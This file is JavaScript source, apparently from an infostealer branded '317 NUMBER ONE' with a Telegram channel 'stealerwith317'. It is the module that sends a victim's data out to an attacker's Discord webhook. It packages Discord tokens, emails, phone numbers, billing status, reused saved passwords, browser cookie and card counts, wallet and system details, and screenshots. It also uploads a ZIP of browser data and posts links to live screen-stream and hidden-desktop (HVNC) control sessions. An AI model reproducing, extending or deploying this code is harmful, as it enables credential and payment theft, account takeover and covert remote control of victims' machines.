// 317 NUMBER ONE - Discord Webhook Exfiltration
const FormData = require('form-data');
const fs = require('fs');
const fetch = require('node-fetch');
const { sanitizeJSON, snowflakeToDate } = require('../utils/system');
const { smartUpload } = require('../utils/gofile');

/**
 * Build master embed with all collected data
 */
function buildDiscordEmbeds(validAccounts, systemInfo) {
  const embeds = [];
  
  // Discord Intelligence Embeds (one per account, max 8)
  if (validAccounts.length === 0) {
    // No valid accounts - show placeholder
    embeds.push({
      author: {
        name: '317 NUMBER ONE — Discord Intelligence',
        icon_url: 'https://files.catbox.moe/zc9b0w.png'
      },
      color: 2829617,
      thumbnail: {
        url: 'https://files.catbox.moe/zc9b0w.png'
      },
      fields: [
        {
          name: '<a:token:1502431093004177529> Token',
          value: '<a:no:1502431716403580969> `Not Found`',
          inline: false
        },
        {
          name: '<:member:1502437057644204192> Username',
          value: '<a:no:1502431716403580969> `Unknown`',
          inline: true
        },
        {
          name: '<:ID:1502437444400975933> ID',
          value: '<a:no:1502431716403580969> `Unknown`',
          inline: true
        },
        {
          name: '\u200B',
          value: '\u200B',
          inline: true
        }
      ],
      image: {
        url: 'https://files.catbox.moe/7hptko.gif'
      },
      footer: {
        text: `https://t.me/stealerwith317`,
        icon_url: 'https://files.catbox.moe/zc9b0w.png'
      }
    });
  } else {
    for (let i = 0; i < validAccounts.length; i++) {
      const acc = validAccounts[i];
      const accountLabel = validAccounts.length > 1 
        ? `317 NUMBER ONE — Discord Intelligence [${i + 1}/${validAccounts.length}]`
        : '317 NUMBER ONE — Discord Intelligence';
      
      embeds.push({
        author: {
          name: accountLabel,
          icon_url: 'https://files.catbox.moe/zc9b0w.png'
        },
        color: 2829617,
        thumbnail: {
          url: acc.avatarUrl
        },
        fields: [
          {
            name: `<a:token:1502431093004177529> Token (${sanitizeJSON(acc.id)})`,
            value: `\`\`\`\n${sanitizeJSON(acc.token)}\n\`\`\``,
            inline: false
          },
          // Row 1: Username, Mail, Phone
          {
            name: '<:member:1502437057644204192> Username',
            value: `\`${sanitizeJSON(acc.username)}\``,
            inline: true
          },
          {
            name: '<a:mail:1502437800220295239> Mail',
            value: acc.email === 'Unverified' 
              ? '<a:no:1502431716403580969> `Unverified`'
              : `\`${sanitizeJSON(acc.email)}\``,
            inline: true
          },
          {
            name: '<a:phone:1502433196132925482> Phone',
            value: acc.phone === 'Unlinked'
              ? '<a:no:1502431716403580969> `Unlinked`'
              : `\`${sanitizeJSON(acc.phone)}\``,
            inline: true
          },
          // Row 2: Badges, 2FA, Billing
          {
            name: '<a:love:1502445624719839292> Badges',
            value: (acc.badges === 'None' || acc.badges === 'Unknown')
              ? `\`${acc.badges}\``
              : acc.badges,
            inline: true
          },
          {
            name: '<:sec:1502436352694685827> 2FA',
            value: acc.mfa === 'Enabled'
              ? '<a:yes:1502431686120706048> `Enabled`'
              : '<a:no:1502431716403580969> `Disabled`',
            inline: true
          },
          {
            name: '<a:card:1502427756959367278> Billing',
            value: (acc.billing === 'None' || acc.billing === 'Unknown Type')
              ? `\`${acc.billing}\``
              : acc.billing,
            inline: true
          }
        ],
        image: {
          url: acc.bannerUrl || 'https://files.catbox.moe/7hptko.gif'
        },
        footer: {
          text: `https://t.me/stealerwith317 - 📅 Created: ${sanitizeJSON(snowflakeToDate(acc.id))}`,
          icon_url: 'https://files.catbox.moe/zc9b0w.png'
        }
      });
    }
  }
  return embeds;
}

/**
 * Build system intelligence embed
 */
function buildSystemEmbed(systemInfo, topPasswords, browserStats) {
  // Full Inline Grid — 3 columns: Status | System | Data
  
  let description = '';
  
  // Common passwords section (in description)
  if (topPasswords.size > 0) {
    const sortedPasswords = Array.from(topPasswords.entries())
      .filter(([pw, count]) => count >= 2 && pw.length > 0)
      .sort((a, b) => b[1] - a[1]);
    
    if (sortedPasswords.length > 0) {
      description += '**<:1key:1508686894702137504> Common Passwords:**\n';
      for (const [password, count] of sortedPasswords) {
        description += `<a:arrow:1502741841664278528> \`${sanitizeJSON(password)}\` used **${count}** times.\n`;
      }
    }
  }
  
  // Status field (column 1) — browsers, launchers, games, wallets
  let statusField = '';
  statusField += `<:emote3:1502373656867770469> ${systemInfo.browsers}\n`;
  statusField += `<:emote5:1502373711272087723> ${systemInfo.launchers}\n`;
  statusField += `<:emote4:1502373686315847822> ${systemInfo.games}\n`;
  statusField += `<:emote1:1502373540295475382> ${systemInfo.wallets}\n`;
  
  // Shorten CPU name: "AMD Ryzen 5 7600X 6-Core Processor" → "R5 7600X"
  const shortenCpu = (cpu) => {
    let s = cpu.replace(/\(R\)|\(TM\)|Processor|CPU|@.*$/gi, '').trim();
    s = s.replace(/\b\d+-Core\b/gi, '').trim();
    s = s.replace(/AMD Ryzen\s*/i, 'R').replace(/Intel Core\s*/i, '');
    return s.replace(/\s+/g, ' ').trim();
  };
  // Shorten GPU name: "NVIDIA GeForce RTX 4070" → "RTX 4070"
  const shortenGpu = (gpu) => {
    return gpu.replace(/NVIDIA\s+GeForce\s*/i, '').replace(/AMD\s+Radeon\s*/i, '').replace(/Intel\s+(UHD|HD|Iris)\s*/i, '$1 ').trim();
  };

  // System field (column 2) — IP, PC, CPU, GPU, RAM
  let systemField = '';
  systemField += `<:emoji_56:1506792420719984711> \`${systemInfo.ip}\`\n`;
  systemField += `<:emoji_52:1506792162073772032> \`${shortenCpu(systemInfo.cpu)}\`\n`;
  systemField += `<:emoji_55:1506792364599939072> \`${shortenGpu(systemInfo.gpu)}\`\n`;
  systemField += `<:emoji_50:1506792041449918494> \`${systemInfo.ram}\`\n`;
  
  // Data field (column 3) — dynamic browser stats
  const stats = browserStats || { browsers: {}, total: { passwords: 0, cookies: 0, autofills: 0, cards: 0 } };
  
  const browserDiscordEmojis = {
    'chrome': '<:Google:1502724081039179857>',
    'chrome_beta': '<:Google:1502724081039179857>',
    'chromium': '<:Google:1502724081039179857>',
    'opera_gx': '<:OperaGX:1502714623512547449>',
    'opera': '<:Opera:1502714604415881367>',
    'brave': '<:Brave:1502714705196748874>',
    'edge': '<:Edge:1502724095027056791>',
    'firefox': '<:Firefox:1502724165143363614>',
    'firefox_beta': '<:Firefox:1502724165143363614>',
    'firefox_dev': '<:Firefox:1502724165143363614>',
    'firefox_esr': '<:Firefox:1502724165143363614>',
    'firefox_nightly': '<:Firefox:1502724165143363614>',
    'vivaldi': '<:Google:1502724081039179857>',
    'yandex': '<:Yandex:1502716244481020014>',
    'coccoc': '<:Google:1502724081039179857>',
    'qq': '<:Google:1502724081039179857>',
    '360speed': '<:Google:1502724081039179857>',
    '360secure': '<:Google:1502724081039179857>'
  };
  
  let dataField = '';
  const browserNames = Object.keys(stats.browsers);
  if (browserNames.length > 0) {
    for (const name of browserNames) {
      const b = stats.browsers[name];
      const displayName = name.charAt(0).toUpperCase() + name.slice(1).replace(/_/g, ' ');
      const hasData = b.passwords > 0 || b.cookies > 0 || b.autofills > 0 || b.cards > 0;
      
      if (hasData) {
        let parts = [];
        if (b.cookies > 0) parts.push(`${b.cookies}C`);
        if (b.autofills > 0) parts.push(`${b.autofills}A`);
        if (b.passwords > 0) parts.push(`${b.passwords}P`);
        if (b.cards > 0) parts.push(`${b.cards}CC`);
        const emoji = browserDiscordEmojis[name] || '<:Google:1502724081039179857>';
        dataField += `${emoji} \`${parts.join(' \u00b7 ')}\`\n`;
      }
    }
  }
  if (!dataField) dataField = 'No data found.';
  
  const embed = {
    author: {
      name: '317 NUMBER ONE \u2014 System Intelligence',
      icon_url: 'https://files.catbox.moe/zc9b0w.png'
    },
    color: 2829617,
    thumbnail: {
      url: 'https://files.catbox.moe/zc9b0w.png'
    },
    description: description || undefined,
    fields: [
      {
        name: '<a:mik:1502748546833846445> **Status**',
        value: statusField,
        inline: true
      },
      {
        name: '<a:okay:1467982289052111163> **System**',
        value: systemField,
        inline: true
      },
      {
        name: '<:meliodas:1506738962738315335> **Data**',
        value: dataField,
        inline: true
      }
    ],
    footer: {
      text: `https://t.me/stealerwith317 • ${systemInfo.computerName}`,
      icon_url: 'https://files.catbox.moe/zc9b0w.png'
    }
  };
  
  return [embed];
}

/**
 * Build rare servers embed
 */
function buildRareServersEmbed(rareServers, systemInfo) {
  let description = `**${rareServers.rareCount} Rare Servers Found**\n\n`;
  
  if (rareServers.rareList === '') {
    description += '<a:no:1502431716403580969> No rare servers detected.\n';
  } else {
    description += rareServers.rareList;
  }
  
  return {
    author: {
      name: '317 NUMBER ONE \u2014 Rare Servers',
      icon_url: 'https://files.catbox.moe/zc9b0w.png'
    },
    color: 2829617,
    description,
    footer: {
      text: `317 \u00b7 ${systemInfo.username}`,
      icon_url: 'https://files.catbox.moe/zc9b0w.png'
    }
  };
}

/**
 * Build rare friends embed(s) — splits into multiple if list is too long
 * Returns an array of embeds. Second embed has no author (seamless continuation).
 */
function buildRareFriendsEmbed(rareFriends, systemInfo) {
  if (rareFriends.rareList === '') {
    return [{
      author: {
        name: '317 NUMBER ONE — Rare Friends',
        icon_url: 'https://files.catbox.moe/zc9b0w.png'
      },
      color: 2829617,
      description: `**${rareFriends.rareCount} Rare Friends Found**\n\n<a:no:1502431716403580969> No rare friends detected.\n\n<:total1:1502375667428233409> **Total Friends**\n\`${rareFriends.totalFriends}\``,
      footer: {
        text: `https://t.me/stealerwith317`,
        icon_url: 'https://files.catbox.moe/zc9b0w.png'
      }
    }];
  }
  
  const header = `**${rareFriends.rareCount} Rare Friends Found**\n\n`;
  const footer = `\n<:total1:1502375667428233409> **Total Friends**\n\`${rareFriends.totalFriends}\``;
  const lines = rareFriends.rareList.split('\n').filter(l => l.length > 0);
  
  // Try to fit in single embed first (max 3900 chars to be safe)
  const singleDesc = header + lines.join('\n') + footer;
  if (singleDesc.length <= 3900) {
    return [{
      author: {
        name: '317 NUMBER ONE — Rare Friends',
        icon_url: 'https://files.catbox.moe/zc9b0w.png'
      },
      color: 2829617,
      description: singleDesc,
      footer: {
        text: `https://t.me/stealerwith317`,
        icon_url: 'https://files.catbox.moe/zc9b0w.png'
      }
    }];
  }
  
  // Split into two embeds
  let firstPart = '';
  let secondPart = '';
  let splitIndex = 0;
  
  // Fill first embed (leave room for header, ~3600 chars max for content)
  const maxFirstLen = 3600 - header.length;
  let currentLen = 0;
  for (let i = 0; i < lines.length; i++) {
    if (currentLen + lines[i].length + 1 > maxFirstLen) {
      splitIndex = i;
      break;
    }
    currentLen += lines[i].length + 1;
    splitIndex = i + 1;
  }
  
  firstPart = lines.slice(0, splitIndex).join('\n');
  secondPart = lines.slice(splitIndex).join('\n');
  
  const embeds = [];
  
  // First embed — with author header
  embeds.push({
    author: {
      name: '317 NUMBER ONE — Rare Friends',
      icon_url: 'https://files.catbox.moe/zc9b0w.png'
    },
    color: 2829617,
    description: header + firstPart
  });
  
  // Second embed — no author, seamless continuation
  embeds.push({
    color: 2829617,
    description: secondPart + footer,
    footer: {
      text: `https://t.me/stealerwith317`,
      icon_url: 'https://files.catbox.moe/zc9b0w.png'
    }
  });
  
  return embeds;
}

/**
 * Send webhook request with retry and rate limit handling
 */
async function sendWebhookRequest(webhookUrl, form, attempt = 1) {
  const maxRetries = 3;
  const url = webhookUrl.includes('?') ? webhookUrl + '&wait=true' : webhookUrl + '?wait=true';
  
  try {
    const response = await fetch(url, {
      method: 'POST',
      body: form,
      headers: form.getHeaders()
    });
    
    // Rate limited — wait and retry
    if (response.status === 429) {
      const retryData = await response.json().catch(() => ({}));
      const retryAfter = (retryData.retry_after || 2) * 1000;
      console.log(`[Discord] Rate limited, waiting ${retryAfter}ms (attempt ${attempt}/${maxRetries})`);
      if (attempt < maxRetries) {
        await new Promise(r => setTimeout(r, retryAfter + 500));
        return sendWebhookRequest(webhookUrl, form, attempt + 1);
      }
      return false;
    }
    
    // Server error — retry
    if (response.status >= 500 && attempt < maxRetries) {
      console.log(`[Discord] Server error ${response.status}, retrying (attempt ${attempt}/${maxRetries})`);
      await new Promise(r => setTimeout(r, 2000 * attempt));
      return sendWebhookRequest(webhookUrl, form, attempt + 1);
    }
    
    if (!response.ok) {
      const errorBody = await response.text().catch(() => 'no body');
      console.error(`[Discord] Webhook failed: ${response.status} ${response.statusText} — ${errorBody}`);
      return false;
    }
    
    return true;
  } catch (error) {
    if (attempt < maxRetries) {
      console.log(`[Discord] Network error, retrying (attempt ${attempt}/${maxRetries}): ${error.message}`);
      await new Promise(r => setTimeout(r, 2000 * attempt));
      return sendWebhookRequest(webhookUrl, form, attempt + 1);
    }
    console.error(`[Discord] Webhook request failed after ${maxRetries} attempts: ${error.message}`);
    return false;
  }
}

/**
 * Calculate total character count of embeds (Discord limit: 6000 per message)
 */
function embedCharCount(embed) {
  let count = 0;
  if (embed.title) count += embed.title.length;
  if (embed.description) count += embed.description.length;
  if (embed.author && embed.author.name) count += embed.author.name.length;
  if (embed.footer && embed.footer.text) count += embed.footer.text.length;
  if (embed.fields) {
    for (const f of embed.fields) {
      if (f.name) count += f.name.length;
      if (f.value) count += f.value.length;
    }
  }
  return count;
}

/**
 * Split embeds into batches that respect Discord's 6000 char limit
 */
function splitEmbedsByCharLimit(embeds, maxChars = 5800) {
  const batches = [];
  let currentBatch = [];
  let currentChars = 0;
  
  for (const embed of embeds) {
    const chars = embedCharCount(embed);
    if (currentBatch.length > 0 && (currentChars + chars > maxChars || currentBatch.length >= 10)) {
      batches.push(currentBatch);
      currentBatch = [];
      currentChars = 0;
    }
    currentBatch.push(embed);
    currentChars += chars;
  }
  if (currentBatch.length > 0) batches.push(currentBatch);
  return batches;
}

/**
 * Send webhook with JSON body (no file attachment)
 */
async function sendWebhookJSON(webhookUrl, payload, attempt = 1) {
  const maxRetries = 3;
  // Add ?wait=true for proper error responses
  const url = webhookUrl.includes('?') ? webhookUrl + '&wait=true' : webhookUrl + '?wait=true';
  
  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    
    if (response.status === 429) {
      const retryData = await response.json().catch(() => ({}));
      const retryAfter = (retryData.retry_after || 2) * 1000;
      console.log(`[Discord] Rate limited, waiting ${retryAfter}ms (attempt ${attempt}/${maxRetries})`);
      if (attempt < maxRetries) {
        await new Promise(r => setTimeout(r, retryAfter + 500));
        return sendWebhookJSON(webhookUrl, payload, attempt + 1);
      }
      return false;
    }
    
    if (response.status >= 500 && attempt < maxRetries) {
      console.log(`[Discord] Server error ${response.status}, retrying (attempt ${attempt}/${maxRetries})`);
      await new Promise(r => setTimeout(r, 2000 * attempt));
      return sendWebhookJSON(webhookUrl, payload, attempt + 1);
    }
    
    if (!response.ok) {
      const errorBody = await response.text().catch(() => 'no body');
      console.error(`[Discord] Webhook JSON failed: ${response.status} — ${errorBody}`);
      return false;
    }
    
    return true;
  } catch (error) {
    if (attempt < maxRetries) {
      console.log(`[Discord] Network error, retrying (attempt ${attempt}/${maxRetries}): ${error.message}`);
      await new Promise(r => setTimeout(r, 2000 * attempt));
      return sendWebhookJSON(webhookUrl, payload, attempt + 1);
    }
    console.error(`[Discord] Webhook JSON failed after ${maxRetries} attempts: ${error.message}`);
    return false;
  }
}

/**
 * Upload data to Discord webhook
 */
async function uploadToWebhook(webhookUrl, embeds, zipFilePath) {
  try {
    if (!webhookUrl) {
      console.error('[Discord] No webhook URL configured');
      return false;
    }
    
    // If ZIP file exists, upload with smart fallback first
    let uploadLink = null;
    let hasFileAttachment = false;
    
    if (zipFilePath && fs.existsSync(zipFilePath)) {
      console.log('[Discord] Uploading browser data with smart fallback...');
      const uploadResult = await smartUpload(zipFilePath, 'Browser-Datas.zip');
      
      if (uploadResult.success) {
        uploadLink = uploadResult.link;
        console.log('[Discord] Upload successful');
        
        // Add upload link as a field at the bottom of the last embed (System Intelligence)
        if (embeds.length > 0) {
          const lastEmbed = embeds[embeds.length - 1];
          if (!lastEmbed.fields) lastEmbed.fields = [];
          lastEmbed.fields.push({
            name: '<:downloadfolder:1508371085056540734> **Browser Data Archive**',
            value: `<:download:1508371834867945503> [Download from Cloud](${uploadLink})  \u2022  <:1cloud:1508371877901500426> \`${uploadResult.size} MB\``,
            inline: false
          });
        }
      } else {
        console.log('[Discord] Upload failed, will try direct attachment');
        hasFileAttachment = true;
      }
    }
    
    // Split embeds respecting Discord's 6000 char limit per message
    const batches = splitEmbedsByCharLimit(embeds);
    console.log(`[Discord] Sending ${embeds.length} embeds in ${batches.length} batch(es)`);
    
    for (let i = 0; i < batches.length; i++) {
      const batch = batches[i];
      
      const payload = {
        username: '317 NUMBER ONE',
        avatar_url: 'https://files.catbox.moe/3yzc46.png',
        embeds: batch
      };
      
      let success;
      
      // Use FormData only if we need to attach a file (first batch only)
      if (i === 0 && hasFileAttachment && zipFilePath && fs.existsSync(zipFilePath)) {
        console.log('[Discord] Sending with ZIP attachment...');
        const form = new FormData();
        form.append('payload_json', JSON.stringify(payload));
        form.append('file', fs.createReadStream(zipFilePath), {
          filename: 'Browser-Datas.zip',
          contentType: 'application/zip'
        });
        success = await sendWebhookRequest(webhookUrl, form);
      } else {
        // No file — use simple JSON (more reliable)
        success = await sendWebhookJSON(webhookUrl, payload);
      }
      
      if (!success) {
        console.error(`[Discord] Failed to send embed batch ${i + 1}/${batches.length}`);
        return false;
      }
      
      // Delay between batches to avoid rate limits
      if (i < batches.length - 1) {
        await new Promise(r => setTimeout(r, 1200));
      }
    }
    
    return true;
  } catch (error) {
    console.error('[Discord] Webhook upload error:', error.message);
    return false;
  }
}

/**
 * Send screenshot to webhook
 */
async function sendScreenshotWebhook(webhookUrl, screenshotPath, systemInfo) {
  try {
    const now = new Date();
    const timeStr = `${String(now.getDate()).padStart(2, '0')}/${String(now.getMonth() + 1).padStart(2, '0')}/${now.getFullYear()}, ${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')}:${String(now.getSeconds()).padStart(2, '0')}`;
    
    const embed = {
      author: {
        name: '317 NUMBER ONE — Screenshot',
        icon_url: 'https://files.catbox.moe/zc9b0w.png'
      },
      color: 2829617,
      fields: [
        {
          name: '<:user:1502474461348106401> Username',
          value: `\`${sanitizeJSON(systemInfo.username)}\``,
          inline: true
        },
        {
          name: '<:txme:1502476765153460325> Time',
          value: `\`${timeStr}\``,
          inline: true
        }
      ],
      image: {
        url: 'attachment://screenshot.png'
      },
      footer: {
        text: `https://t.me/stealerwith317`,
        icon_url: 'https://files.catbox.moe/zc9b0w.png'
      }
    };
    
    const form = new FormData();
    
    const payload = {
      username: '317 NUMBER ONE',
      avatar_url: 'https://files.catbox.moe/3yzc46.png',
      embeds: [embed]
    };
    
    form.append('payload_json', JSON.stringify(payload));
    form.append('file', fs.createReadStream(screenshotPath), {
      filename: 'screenshot.png',
      contentType: 'image/png'
    });
    
    return await sendWebhookRequest(webhookUrl, form);
  } catch (error) {
    console.error('[Discord] Screenshot webhook error:', error.message);
    return false;
  }
}

/**
 * Build stream session embed
 */
function buildStreamEmbed(streamInfo, systemInfo) {
  const viewUrl = streamInfo.viewUrl || `http://${systemInfo.ip}:${streamInfo.port}/${streamInfo.agentId}`;
  
  return {
    author: {
      name: '317 NUMBER ONE — Stream Session',
      icon_url: 'https://files.catbox.moe/zc9b0w.png'
    },
    color: 2829617,
    thumbnail: {
      url: 'https://files.catbox.moe/zc9b0w.png'
    },
    fields: [
      {
        name: '<a:status:1502476123450249287> Status',
        value: '<a:yes:1502431686120706048> `Online`',
        inline: true
      },
      {
        name: '<:1id:1508531594573381785> ID',
        value: `\`${streamInfo.agentId}\``,
        inline: true
      },
      {
        name: '<:1link:1508525826701000725> View',
        value: `[Click to View!](${viewUrl})`,
        inline: true
      }
    ],
    footer: {
      text: `https://t.me/stealerwith317`,
      icon_url: 'https://files.catbox.moe/zc9b0w.png'
    }
  };
}

/**
 * Build HVNC session embed — matching 317 NUMBER ONE style
 */
function buildHvncEmbed(hvncInfo, systemInfo) {
  const panelUrl = hvncInfo.viewUrl || `http://${systemInfo.ip || '0.0.0.0'}:7317/${hvncInfo.agentId}/hvnc`;
  
  return {
    author: {
      name: '317 NUMBER ONE — HVNC Session',
      icon_url: 'https://files.catbox.moe/zc9b0w.png'
    },
    color: 2829617,
    thumbnail: {
      url: 'https://files.catbox.moe/zc9b0w.png'
    },
    fields: [
      {
        name: '<a:status:1502476123450249287> Status',
        value: '<a:yes:1502431686120706048> `Active`',
        inline: true
      },
      {
        name: '<:1id:1508531594573381785> ID',
        value: `\`${hvncInfo.agentId}\``,
        inline: true
      },
      {
        name: '<:1computer:1508525174004383837> Desktop',
        value: `\`${hvncInfo.desktopName}\``,
        inline: true
      },
      {
        name: '<:1link:1508525826701000725> Panel',
        value: `[Click to Open!](${panelUrl})`,
        inline: false
      }
    ],
    footer: {
      text: `https://t.me/stealerwith317`,
      icon_url: 'https://files.catbox.moe/zc9b0w.png'
    }
  };
}

module.exports = {
  buildDiscordEmbeds,
  buildSystemEmbed,
  buildRareServersEmbed,
  buildRareFriendsEmbed,
  buildStreamEmbed,
  buildHvncEmbed,
  uploadToWebhook,
  sendScreenshotWebhook
};
